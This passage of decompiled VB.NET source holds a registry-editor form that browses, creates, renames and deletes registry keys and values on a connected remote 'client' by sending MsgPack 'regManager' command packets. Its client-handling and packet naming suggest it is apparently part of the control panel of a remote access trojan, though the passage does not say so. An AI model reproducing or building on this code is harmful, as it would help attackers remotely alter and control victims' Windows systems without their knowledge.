					AddHandler modifyBinaryDataToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000324 RID: 804
		' (get) Token: 0x060007BE RID: 1982 RVA: 0x0004173B File Offset: 0x0003F93B
		' (set) Token: 0x060007BF RID: 1983 RVA: 0x00041745 File Offset: 0x0003F945
		Private Overridable Property modifyToolStripSeparator1 As ToolStripSeparator

		' Token: 0x17000325 RID: 805
		' (get) Token: 0x060007C0 RID: 1984 RVA: 0x0004174E File Offset: 0x0003F94E
		' (set) Token: 0x060007C1 RID: 1985 RVA: 0x00041758 File Offset: 0x0003F958
		Private Overridable Property deleteToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._deleteToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteToolStripMenuItem1_Click
				Dim deleteToolStripMenuItem As ToolStripMenuItem = Me._deleteToolStripMenuItem1
				If deleteToolStripMenuItem IsNot Nothing Then
					RemoveHandler deleteToolStripMenuItem.Click, value2
				End If
				Me._deleteToolStripMenuItem1 = value
				deleteToolStripMenuItem = Me._deleteToolStripMenuItem1
				If deleteToolStripMenuItem IsNot Nothing Then
					AddHandler deleteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000326 RID: 806
		' (get) Token: 0x060007C2 RID: 1986 RVA: 0x0004179B File Offset: 0x0003F99B
		' (set) Token: 0x060007C3 RID: 1987 RVA: 0x000417A8 File Offset: 0x0003F9A8
		Private Overridable Property renameToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._renameToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RenameToolStripMenuItem1_Click
				Dim renameToolStripMenuItem As ToolStripMenuItem = Me._renameToolStripMenuItem1
				If renameToolStripMenuItem IsNot Nothing Then
					RemoveHandler renameToolStripMenuItem.Click, value2
				End If
				Me._renameToolStripMenuItem1 = value
				renameToolStripMenuItem = Me._renameToolStripMenuItem1
				If renameToolStripMenuItem IsNot Nothing Then
					AddHandler renameToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000327 RID: 807
		' (get) Token: 0x060007C4 RID: 1988 RVA: 0x000417EB File Offset: 0x0003F9EB
		' (set) Token: 0x060007C5 RID: 1989 RVA: 0x000417F8 File Offset: 0x0003F9F8
		Friend Overridable Property RefreshToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem_Click
				Dim refreshToolStripMenuItem As ToolStripMenuItem = Me._RefreshToolStripMenuItem
				If refreshToolStripMenuItem IsNot Nothing Then
					RemoveHandler refreshToolStripMenuItem.Click, value2
				End If
				Me._RefreshToolStripMenuItem = value
				refreshToolStripMenuItem = Me._RefreshToolStripMenuItem
				If refreshToolStripMenuItem IsNot Nothing Then
					AddHandler refreshToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000328 RID: 808
		' (get) Token: 0x060007C6 RID: 1990 RVA: 0x0004183B File Offset: 0x0003FA3B
		' (set) Token: 0x060007C7 RID: 1991 RVA: 0x00041848 File Offset: 0x0003FA48
		Friend Overridable Property RefreshToolStripMenuItem2 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshToolStripMenuItem2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem2_Click
				Dim refreshToolStripMenuItem As ToolStripMenuItem = Me._RefreshToolStripMenuItem2
				If refreshToolStripMenuItem IsNot Nothing Then
					RemoveHandler refreshToolStripMenuItem.Click, value2
				End If
				Me._RefreshToolStripMenuItem2 = value
				refreshToolStripMenuItem = Me._RefreshToolStripMenuItem2
				If refreshToolStripMenuItem IsNot Nothing Then
					AddHandler refreshToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000329 RID: 809
		' (get) Token: 0x060007C8 RID: 1992 RVA: 0x0004188B File Offset: 0x0003FA8B
		' (set) Token: 0x060007C9 RID: 1993 RVA: 0x00041898 File Offset: 0x0003FA98
		Friend Overridable Property RefreshToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem1_Click
				Dim refreshToolStripMenuItem As ToolStripMenuItem = Me._RefreshToolStripMenuItem1
				If refreshToolStripMenuItem IsNot Nothing Then
					RemoveHandler refreshToolStripMenuItem.Click, value2
				End If
				Me._RefreshToolStripMenuItem1 = value
				refreshToolStripMenuItem = Me._RefreshToolStripMenuItem1
				If refreshToolStripMenuItem IsNot Nothing Then
					AddHandler refreshToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700032A RID: 810
		' (get) Token: 0x060007CA RID: 1994 RVA: 0x000418DB File Offset: 0x0003FADB
		' (set) Token: 0x060007CB RID: 1995 RVA: 0x000418E5 File Offset: 0x0003FAE5
		Friend Overridable Property Panel1 As Panel

		' Token: 0x1700032B RID: 811
		' (get) Token: 0x060007CC RID: 1996 RVA: 0x000418EE File Offset: 0x0003FAEE
		' (set) Token: 0x060007CD RID: 1997 RVA: 0x000418F8 File Offset: 0x0003FAF8
		Friend Overridable Property TextBox1 As TextBox

		' Token: 0x1700032C RID: 812
		' (get) Token: 0x060007CE RID: 1998 RVA: 0x00041901 File Offset: 0x0003FB01
		' (set) Token: 0x060007CF RID: 1999 RVA: 0x0004190B File Offset: 0x0003FB0B
		Public Overridable Property NameForm As UILabel

		' Token: 0x1700032D RID: 813
		' (get) Token: 0x060007D0 RID: 2000 RVA: 0x00041914 File Offset: 0x0003FB14
		' (set) Token: 0x060007D1 RID: 2001 RVA: 0x0004191E File Offset: 0x0003FB1E
		Public Overridable Property ClientInfo As Label

		' Token: 0x1700032E RID: 814
		' (get) Token: 0x060007D2 RID: 2002 RVA: 0x00041927 File Offset: 0x0003FB27
		' (set) Token: 0x060007D3 RID: 2003 RVA: 0x00041931 File Offset: 0x0003FB31
		Friend Overridable Property Guna2Elipse1 As Guna2Elipse

		' Token: 0x1700032F RID: 815
		' (get) Token: 0x060007D4 RID: 2004 RVA: 0x0004193A File Offset: 0x0003FB3A
		' (set) Token: 0x060007D5 RID: 2005 RVA: 0x00041944 File Offset: 0x0003FB44
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x17000330 RID: 816
		' (get) Token: 0x060007D6 RID: 2006 RVA: 0x0004194D File Offset: 0x0003FB4D
		' (set) Token: 0x060007D7 RID: 2007 RVA: 0x00041957 File Offset: 0x0003FB57
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000331 RID: 817
		' (get) Token: 0x060007D8 RID: 2008 RVA: 0x00041960 File Offset: 0x0003FB60
		' (set) Token: 0x060007D9 RID: 2009 RVA: 0x0004196A File Offset: 0x0003FB6A
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000332 RID: 818
		' (get) Token: 0x060007DA RID: 2010 RVA: 0x00041973 File Offset: 0x0003FB73
		' (set) Token: 0x060007DB RID: 2011 RVA: 0x0004197D File Offset: 0x0003FB7D
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000333 RID: 819
		' (get) Token: 0x060007DC RID: 2012 RVA: 0x00041986 File Offset: 0x0003FB86
		' (set) Token: 0x060007DD RID: 2013 RVA: 0x00041990 File Offset: 0x0003FB90
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x17000334 RID: 820
		' (get) Token: 0x060007DE RID: 2014 RVA: 0x00041999 File Offset: 0x0003FB99
		' (set) Token: 0x060007DF RID: 2015 RVA: 0x000419A4 File Offset: 0x0003FBA4
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000335 RID: 821
		' (get) Token: 0x060007E0 RID: 2016 RVA: 0x000419E7 File Offset: 0x0003FBE7
		' (set) Token: 0x060007E1 RID: 2017 RVA: 0x000419F1 File Offset: 0x0003FBF1
		Friend Property Client As Clients

		' Token: 0x17000336 RID: 822
		' (get) Token: 0x060007E2 RID: 2018 RVA: 0x000419FA File Offset: 0x0003FBFA
		' (set) Token: 0x060007E3 RID: 2019 RVA: 0x00041A04 File Offset: 0x0003FC04
		Friend Property ParentClient As Clients

		' Token: 0x17000337 RID: 823
		' (get) Token: 0x060007E4 RID: 2020 RVA: 0x00041A0D File Offset: 0x0003FC0D
		' (set) Token: 0x060007E5 RID: 2021 RVA: 0x00041A17 File Offset: 0x0003FC17
		Public Property F As FormS500

		' Token: 0x060007E6 RID: 2022 RVA: 0x00041A20 File Offset: 0x0003FC20
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormRegistryE_Load
			AddHandler MyBase.Resize, AddressOf Me.FormRegistryE_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x060007E7 RID: 2023 RVA: 0x00041A60 File Offset: 0x0003FC60
		Private Sub FormRegistryE_Load(sender As Object, e As EventArgs)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x060007E8 RID: 2024 RVA: 0x00041B48 File Offset: 0x0003FD48
		Private Sub AddRootKey(match As RegistrySeeker.RegSeekerMatch)
			Dim treeNode As TreeNode = Me.CreateNode(match.Key, match.Key, match.Data)
			treeNode.Nodes.Add(New TreeNode())
			Me.tvRegistryDirectory.Nodes.Add(treeNode)
		End Sub

		' Token: 0x060007E9 RID: 2025 RVA: 0x00041B94 File Offset: 0x0003FD94
		Private Function AddKeyToTree(parent As TreeNode, subKey As RegistrySeeker.RegSeekerMatch) As TreeNode
			Dim treeNode As TreeNode = Me.CreateNode(subKey.Key, subKey.Key, subKey.Data)
			parent.Nodes.Add(treeNode)
			Dim hasSubKeys As Boolean = subKey.HasSubKeys
			If hasSubKeys Then
				treeNode.Nodes.Add(New TreeNode())
			End If
			Return treeNode
		End Function

		' Token: 0x060007EA RID: 2026 RVA: 0x00041BE8 File Offset: 0x0003FDE8
		Private Function CreateNode(key As String, text As String, tag As Object) As TreeNode
			Return New TreeNode() With { .Text = text, .Name = key, .Tag = RuntimeHelpers.GetObjectValue(tag) }
		End Function

		' Token: 0x060007EB RID: 2027 RVA: 0x00041C1C File Offset: 0x0003FE1C
		Public Sub AddKeys(rootKey As String, matches As RegistrySeeker.RegSeekerMatch())
			Dim flag As Boolean = String.IsNullOrEmpty(rootKey)
			If flag Then
				Me.tvRegistryDirectory.BeginUpdate()
				For Each match As RegistrySeeker.RegSeekerMatch In matches
					Me.AddRootKey(match)
				Next
				Me.tvRegistryDirectory.SelectedNode = Me.tvRegistryDirectory.Nodes(0)
				Me.tvRegistryDirectory.EndUpdate()
			Else
				Dim treeNode As TreeNode = Me.GetTreeNode(rootKey)
				Dim flag2 As Boolean = treeNode IsNot Nothing
				If flag2 Then
					Me.tvRegistryDirectory.BeginUpdate()
					For Each subKey As RegistrySeeker.RegSeekerMatch In matches
						Me.AddKeyToTree(treeNode, subKey)
					Next
					treeNode.Expand()
					Me.tvRegistryDirectory.EndUpdate()
				End If
			End If
		End Sub

		' Token: 0x060007EC RID: 2028 RVA: 0x00041CF8 File Offset: 0x0003FEF8
		Public Sub CreateNewKey(rootKey As String, match As RegistrySeeker.RegSeekerMatch)
			Dim treeNode As TreeNode = Me.GetTreeNode(rootKey)
			Dim treeNode2 As TreeNode = Me.AddKeyToTree(treeNode, match)
			treeNode2.EnsureVisible()
			Me.tvRegistryDirectory.SelectedNode = treeNode2
			treeNode2.Expand()
			Me.tvRegistryDirectory.LabelEdit = True
			treeNode2.BeginEdit()
		End Sub

		' Token: 0x060007ED RID: 2029 RVA: 0x00041D48 File Offset: 0x0003FF48
		Public Sub DeleteKey(rootKey As String, subKey As String)
			Dim treeNode As TreeNode = Me.GetTreeNode(rootKey)
			Dim flag As Boolean = treeNode.Nodes.ContainsKey(subKey)
			If flag Then
				treeNode.Nodes.RemoveByKey(subKey)
			End If
		End Sub

		' Token: 0x060007EE RID: 2030 RVA: 0x00041D80 File Offset: 0x0003FF80
		Public Sub RenameKey(rootKey As String, oldName As String, newName As String)
			Dim treeNode As TreeNode = Me.GetTreeNode(rootKey)
			Dim flag As Boolean = treeNode.Nodes.ContainsKey(oldName)
			If flag Then
				treeNode.Nodes(oldName).Text = newName
				treeNode.Nodes(oldName).Name = newName
				Me.tvRegistryDirectory.SelectedNode = treeNode.Nodes(newName)
			End If
		End Sub

		' Token: 0x060007EF RID: 2031 RVA: 0x00041DE8 File Offset: 0x0003FFE8
		Private Function GetTreeNode(path As String) As TreeNode
			Dim array As String() = path.Split(New Char() { "\"c })
			Dim treeNode As TreeNode = Me.tvRegistryDirectory.Nodes(array(0))
			Dim flag As Boolean = treeNode Is Nothing
			Dim result As TreeNode
			If flag Then
				result = Nothing
			Else
				Dim num As Integer = array.Length - 1
				For i As Integer = 1 To num
					treeNode = treeNode.Nodes(array(i))
					Dim flag2 As Boolean = treeNode Is Nothing
					If flag2 Then
						Return Nothing
					End If
				Next
				result = treeNode
			End If
			Return result
		End Function

		' Token: 0x060007F0 RID: 2032 RVA: 0x00041E64 File Offset: 0x00040064
		Private Sub TvRegistryDirectory_NodeMouseClick(sender As Object, e As TreeNodeMouseClickEventArgs)
			Dim flag As Boolean = e.Button = MouseButtons.Right
			If flag Then
				Me.tvRegistryDirectory.SelectedNode = e.Node
				Dim position As Point = New Point(e.X, e.Y)
				Me.CreateTreeViewMenuStrip()
				Me.tv_ContextMenuStrip.Show(Me.tvRegistryDirectory, position)
			End If
		End Sub

		' Token: 0x060007F1 RID: 2033 RVA: 0x00041EC4 File Offset: 0x000400C4
		Private Sub CreateTreeViewMenuStrip()
			Me.renameToolStripMenuItem.Enabled = (Me.tvRegistryDirectory.SelectedNode.Parent IsNot Nothing)
			Me.deleteToolStripMenuItem.Enabled = (Me.tvRegistryDirectory.SelectedNode.Parent IsNot Nothing)
		End Sub

		' Token: 0x060007F2 RID: 2034 RVA: 0x00041F10 File Offset: 0x00040110
		Public Sub CreateValue(keyPath As String, value As RegistrySeeker.RegValueData)
			Dim treeNode As TreeNode = Me.GetTreeNode(keyPath)
			Dim flag As Boolean = treeNode IsNot Nothing
			If flag Then
				Dim list As List(Of RegistrySeeker.RegValueData) = CType(treeNode.Tag, RegistrySeeker.RegValueData()).ToList()
				list.Add(value)
				treeNode.Tag = list.ToArray()
				Dim flag2 As Boolean = Me.tvRegistryDirectory.SelectedNode Is treeNode
				If flag2 Then
					Dim registryValueLstItem As RegistryValueLstItem = New RegistryValueLstItem(value)
					Me.lstRegistryValues.Items.Add(registryValueLstItem)
					Me.lstRegistryValues.SelectedIndices.Clear()
					registryValueLstItem.Selected = True
					Me.lstRegistryValues.LabelEdit = True
					registryValueLstItem.BeginEdit()
				End If
				Me.tvRegistryDirectory.SelectedNode = treeNode
			End If
		End Sub

		' Token: 0x060007F3 RID: 2035 RVA: 0x00041FC4 File Offset: 0x000401C4
		Public Sub DeleteValue(keyPath As String, valueName As String)
			Dim treeNode As TreeNode = Me.GetTreeNode(keyPath)
			Dim flag As Boolean = treeNode IsNot Nothing
			If flag Then
				Dim flag2 As Boolean = Not RegValueHelper.IsDefaultValue(valueName)
				If flag2 Then
					treeNode.Tag = CType(treeNode.Tag, RegistrySeeker.RegValueData()).Where(Function(value As RegistrySeeker.RegValueData) Operators.CompareString(value.Name, valueName, False) <> 0).ToArray()
					Dim flag3 As Boolean = Me.tvRegistryDirectory.SelectedNode Is treeNode
					If flag3 Then
						Me.lstRegistryValues.Items.RemoveByKey(valueName)
					End If
				Else
					Dim regValueData As RegistrySeeker.RegValueData = CType(treeNode.Tag, RegistrySeeker.RegValueData()).First(Function(item As RegistrySeeker.RegValueData) Operators.CompareString(item.Name, valueName, False) = 0)
					Dim flag4 As Boolean = Me.tvRegistryDirectory.SelectedNode Is treeNode
					If flag4 Then
						Dim registryValueLstItem As RegistryValueLstItem = Me.lstRegistryValues.Items.Cast().SingleOrDefault(Function(item As RegistryValueLstItem) Operators.CompareString(item.Name, valueName, False) = 0)
						Dim flag5 As Boolean = registryValueLstItem IsNot Nothing
						If flag5 Then
							registryValueLstItem.Data = regValueData.Kind.RegistryTypeToString(Nothing)
						End If
					End If
				End If
				Me.tvRegistryDirectory.SelectedNode = treeNode
			End If
		End Sub

		' Token: 0x060007F4 RID: 2036 RVA: 0x000420E4 File Offset: 0x000402E4
		Public Sub RenameValue(keyPath As String, oldName As String, newName As String)
			Dim treeNode As TreeNode = Me.GetTreeNode(keyPath)
			Dim flag As Boolean = treeNode IsNot Nothing
			If flag Then
				Dim regValueData As RegistrySeeker.RegValueData = CType(treeNode.Tag, RegistrySeeker.RegValueData()).First(Function(item As RegistrySeeker.RegValueData) Operators.CompareString(item.Name, oldName, False) = 0)
				regValueData.Name = newName
				Dim flag2 As Boolean = Me.tvRegistryDirectory.SelectedNode Is treeNode
				If flag2 Then
					Dim registryValueLstItem As RegistryValueLstItem = Me.lstRegistryValues.Items.Cast().SingleOrDefault(Function(item As RegistryValueLstItem) Operators.CompareString(item.Name, oldName, False) = 0)
					Dim flag3 As Boolean = registryValueLstItem IsNot Nothing
					If flag3 Then
						registryValueLstItem.RegName = newName
					End If
				End If
				Me.tvRegistryDirectory.SelectedNode = treeNode
			End If
		End Sub

		' Token: 0x060007F5 RID: 2037 RVA: 0x00042194 File Offset: 0x00040394
		Public Sub ChangeValue(keyPath As String, value As RegistrySeeker.RegValueData)
			Dim treeNode As TreeNode = Me.GetTreeNode(keyPath)
			Dim flag As Boolean = treeNode IsNot Nothing
			If flag Then
				Dim dest As RegistrySeeker.RegValueData = CType(treeNode.Tag, RegistrySeeker.RegValueData()).First(Function(item As RegistrySeeker.RegValueData) Operators.CompareString(item.Name, value.Name, False) = 0)
				Me.ChangeRegistryValue(value, dest)
				Dim flag2 As Boolean = Me.tvRegistryDirectory.SelectedNode Is treeNode
				If flag2 Then
					Dim registryValueLstItem As RegistryValueLstItem = Me.lstRegistryValues.Items.Cast().SingleOrDefault(Function(item As RegistryValueLstItem) Operators.CompareString(item.Name, value.Name, False) = 0)
					Dim flag3 As Boolean = registryValueLstItem IsNot Nothing
					If flag3 Then
						registryValueLstItem.Data = RegValueHelper.RegistryValueToString(value)
					End If
				End If
				Me.tvRegistryDirectory.SelectedNode = treeNode
			End If
		End Sub

		' Token: 0x060007F6 RID: 2038 RVA: 0x00042254 File Offset: 0x00040454
		Private Sub ChangeRegistryValue(source As RegistrySeeker.RegValueData, dest As RegistrySeeker.RegValueData)
			Dim flag As Boolean = source.Kind <> dest.Kind
			If Not flag Then
				dest.Data = source.Data
			End If
		End Sub

		' Token: 0x060007F7 RID: 2039 RVA: 0x00042288 File Offset: 0x00040488
		Private Sub TvRegistryDirectory_AfterLabelEdit(sender As Object, e As NodeLabelEditEventArgs)
			Dim flag As Boolean = e.Label <> Nothing
			If flag Then
				e.CancelEdit = True
				Dim flag2 As Boolean = e.Label.Length > 0
				If flag2 Then
					Dim flag3 As Boolean = e.Node.Parent.Nodes.ContainsKey(e.Label)
					If flag3 Then
						MessageBox.Show("Invalid label. " & vbLf & "A node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
						e.Node.BeginEdit()
					Else
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "regManager"
						msgPack.ForcePathObject("Command").AsString = "RenameRegistryKey"
						msgPack.ForcePathObject("OldKeyName").AsString = e.Node.Name
						msgPack.ForcePathObject("NewKeyName").AsString = e.Label
						msgPack.ForcePathObject("ParentPath").AsString = e.Node.Parent.FullPath
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Me.tvRegistryDirectory.LabelEdit = False
					End If
				Else
					MessageBox.Show("Invalid label. " & vbLf & "The label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
					e.Node.BeginEdit()
				End If
			Else
				Me.tvRegistryDirectory.LabelEdit = False
			End If
		End Sub

		' Token: 0x060007F8 RID: 2040 RVA: 0x000423F0 File Offset: 0x000405F0
		Private Sub TvRegistryDirectory_BeforeExpand(sender As Object, e As TreeViewCancelEventArgs)
			Dim node As TreeNode = e.Node
			Dim flag As Boolean = String.IsNullOrEmpty(node.FirstNode.Name)
			If flag Then
				Me.tvRegistryDirectory.SuspendLayout()
				node.Nodes.Clear()
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "regManager"
				msgPack.ForcePathObject("Command").AsString = "LoadRegistryKey"
				msgPack.ForcePathObject("RootKeyName").AsString = node.FullPath
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Thread.Sleep(500)
				Me.tvRegistryDirectory.ResumeLayout()
				e.Cancel = True
			End If
		End Sub

		' Token: 0x060007F9 RID: 2041 RVA: 0x000424BB File Offset: 0x000406BB
		Private Sub TvRegistryDirectory_BeforeSelect(sender As Object, e As TreeViewCancelEventArgs)
			Me.UpdateLstRegistryValues(e.Node)
		End Sub

		' Token: 0x060007FA RID: 2042 RVA: 0x000424CC File Offset: 0x000406CC
		Private Sub UpdateLstRegistryValues(node As TreeNode)
			Try
				Me.TextBox1.Text = node.FullPath
				Dim values As RegistrySeeker.RegValueData() = CType(node.Tag, RegistrySeeker.RegValueData())
				Me.PopulateLstRegistryValues(values)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060007FB RID: 2043 RVA: 0x00042524 File Offset: 0x00040724
		Private Sub PopulateLstRegistryValues(values As RegistrySeeker.RegValueData())
			Me.lstRegistryValues.BeginUpdate()
			Me.lstRegistryValues.Items.Clear()
			Dim source As IEnumerable(Of RegistrySeeker.RegValueData) = values
			Dim keySelector As Func(Of RegistrySeeker.RegValueData, String)
			If FormRegistryE._Closure$__.$I277-0 IsNot Nothing Then
				keySelector = FormRegistryE._Closure$__.$I277-0
			Else
				Dim func As Func(Of RegistrySeeker.RegValueData, String) = Function(value As RegistrySeeker.RegValueData) value.Name
				keySelector = func
				FormRegistryE._Closure$__.$I277-0 = func
			End If
			Dim source2 As IEnumerable(Of RegistrySeeker.RegValueData) = source.OrderBy(keySelector)
			Dim selector As Func(Of RegistrySeeker.RegValueData, RegistrySeeker.RegValueData)
			If FormRegistryE._Closure$__.$I277-1 IsNot Nothing Then
				selector = FormRegistryE._Closure$__.$I277-1
			Else
				Dim func2 As Func(Of RegistrySeeker.RegValueData, RegistrySeeker.RegValueData) = Function(value As RegistrySeeker.RegValueData) value
				selector = func2
				FormRegistryE._Closure$__.$I277-1 = func2
			End If
			values = source2.[Select](selector).ToArray()
			For Each value3 As RegistrySeeker.RegValueData In values
				Dim value2 As RegistryValueLstItem = New RegistryValueLstItem(value3)
				Me.lstRegistryValues.Items.Add(value2)
			Next
			Me.lstRegistryValues.EndUpdate()
			Console.WriteLine(".//")
		End Sub

		' Token: 0x060007FC RID: 2044 RVA: 0x000425F4 File Offset: 0x000407F4
		Private Sub TvRegistryDirectory_KeyUp(sender As Object, e As KeyEventArgs)
			Dim flag As Boolean = e.KeyCode = Keys.Delete AndAlso Me.GetDeleteState()
			If flag Then
				Me.DeleteToolStripMenuItem_Click(Me, e)
			End If
		End Sub

		' Token: 0x060007FD RID: 2045 RVA: 0x00042624 File Offset: 0x00040824
		Private Function GetDeleteState() As Boolean
			Dim focused As Boolean = Me.lstRegistryValues.Focused
			Dim result As Boolean
			If focused Then
				result = (Me.lstRegistryValues.SelectedItems.Count > 0)
			Else
				Dim flag As Boolean = Me.tvRegistryDirectory.Focused AndAlso Me.tvRegistryDirectory.SelectedNode IsNot Nothing
				result = (flag AndAlso Me.tvRegistryDirectory.SelectedNode.Parent IsNot Nothing)
			End If
			Return result
		End Function

		' Token: 0x060007FE RID: 2046 RVA: 0x00042694 File Offset: 0x00040894
		Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = "Are you sure you want to permanently delete this key and all of its subkeys?"
			Dim caption As String = "Confirm Key Delete"
			Dim dialogResult As DialogResult = MessageBox.Show(text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
			Dim flag As Boolean = dialogResult = DialogResult.Yes
			If flag Then
				Dim fullPath As String = Me.tvRegistryDirectory.SelectedNode.Parent.FullPath
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "regManager"
				msgPack.ForcePathObject("Command").AsString = "DeleteRegistryKey"
				msgPack.ForcePathObject("KeyName").AsString = Me.tvRegistryDirectory.SelectedNode.Name
				msgPack.ForcePathObject("ParentPath").AsString = fullPath
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x060007FF RID: 2047 RVA: 0x00042766 File Offset: 0x00040966
		Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.tvRegistryDirectory.LabelEdit = True
			Me.tvRegistryDirectory.SelectedNode.BeginEdit()
		End Sub

		' Token: 0x06000800 RID: 2048 RVA: 0x00042788 File Offset: 0x00040988
		Private Sub KeyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.tvRegistryDirectory.SelectedNode.IsExpanded AndAlso Me.tvRegistryDirectory.SelectedNode.Nodes.Count > 0
			If flag Then
				Me.tvRegistryDirectory.SelectedNode.Expand()
			Else
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "regManager"
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryKey"
				msgPack.ForcePathObject("ParentPath").AsString = Me.tvRegistryDirectory.SelectedNode.FullPath
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x06000801 RID: 2049 RVA: 0x00042850 File Offset: 0x00040A50
		Private Sub StringValueToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.tvRegistryDirectory.SelectedNode IsNot Nothing
			If flag Then
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "regManager"
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue"
				msgPack.ForcePathObject("KeyPath").AsString = Me.tvRegistryDirectory.SelectedNode.FullPath
				msgPack.ForcePathObject("Kindstring").AsString = "1"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x06000802 RID: 2050 RVA: 0x000428FC File Offset: 0x00040AFC
		Private Sub LstRegistryValues_AfterLabelEdit(sender As Object, e As LabelEditEventArgs)
			Dim flag As Boolean = e.Label IsNot Nothing AndAlso Me.tvRegistryDirectory.SelectedNode IsNot Nothing
			If flag Then
				e.CancelEdit = True
				Dim item As Integer = e.Item
				Dim flag2 As Boolean = e.Label.Length > 0
				If flag2 Then
					Dim flag3 As Boolean = Me.lstRegistryValues.Items.ContainsKey(e.Label)
					If flag3 Then
						MessageBox.Show("Invalid label. " & vbLf & "A node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
						Me.lstRegistryValues.Items(item).BeginEdit()
					Else
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "regManager"
						msgPack.ForcePathObject("Command").AsString = "RenameRegistryValue"
						msgPack.ForcePathObject("OldValueName").AsString = Me.lstRegistryValues.Items(item).Name
						msgPack.ForcePathObject("NewValueName").AsString = e.Label
						msgPack.ForcePathObject("KeyPath").AsString = Me.tvRegistryDirectory.SelectedNode.FullPath
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						Me.lstRegistryValues.LabelEdit = False
					End If
				Else
					MessageBox.Show("Invalid label. " & vbLf & "The label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
					Me.lstRegistryValues.Items(item).BeginEdit()
				End If
			Else
